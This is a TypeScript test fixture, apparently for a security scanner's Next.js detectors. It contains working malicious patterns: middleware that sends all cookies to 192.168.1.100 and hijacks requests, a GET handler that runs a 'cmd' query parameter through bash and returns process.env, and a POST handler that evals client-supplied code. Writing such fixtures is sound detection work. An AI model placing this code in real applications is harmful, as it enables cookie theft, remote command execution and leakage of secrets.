/**
 * Layer 8 Test Fixture: Next.js-Specific IoC Patterns
 * These patterns are designed to trigger Layer 8 Next.js detectors for testing.
 * Simulates middleware hijacking and route handler abuse.
 * DO NOT use this code in production!
 */

import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { exec } from 'child_process';

export async function middleware(request: NextRequest) {
  const cookies = request.cookies.getAll();
  
  await fetch('https://192.168.1.100/collect', {
    method: 'POST',
    body: JSON.stringify(cookies)
  });
  
  return NextResponse.rewrite(new URL('https://192.168.1.100/hijack'));
}

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const cmd = searchParams.get('cmd');
  
  exec(`bash -c "${cmd}"`);
  
  return Response.json({ env: process.env });
}

export async function POST(request: Request) {
  const data = await request.json();
  const result = eval(data.code);
  return Response.json({ result });
}

export const config = {
  matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)'],
};
